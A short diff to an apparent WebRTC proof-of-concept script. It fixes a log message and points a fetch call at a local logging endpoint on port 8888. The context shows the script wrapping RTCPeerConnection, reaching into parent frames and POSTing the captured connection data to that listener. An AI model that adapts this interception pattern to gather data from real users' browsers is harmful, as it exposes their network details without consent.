@@ -68,7 +68,7 @@
                 TargetWindow = window.parent.parent;
             }
         } catch (e) {
-            console.log("Cross-origin boundary encountered, applying local fallback fallback.");
+            console.log("Cross-origin boundary encountered, applying local fallback.");
         }
 
         const OriginalPeerConnection = TargetWindow.RTCPeerConnection || window.RTCPeerConnection;
@@ -116,8 +116,8 @@
                         uiDisplay.innerText = displayString;
                         console.log("📊 [WebRTC POC DATA]:", displayString);
 
-                        // 4. Send directly to your local computer port 8888
-                        fetch('http://127.0.0', {
+                        // 4. Send directly to your local computer port 8888 via localhost address string
+                        fetch('http://localhost:8888/log', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: displayString
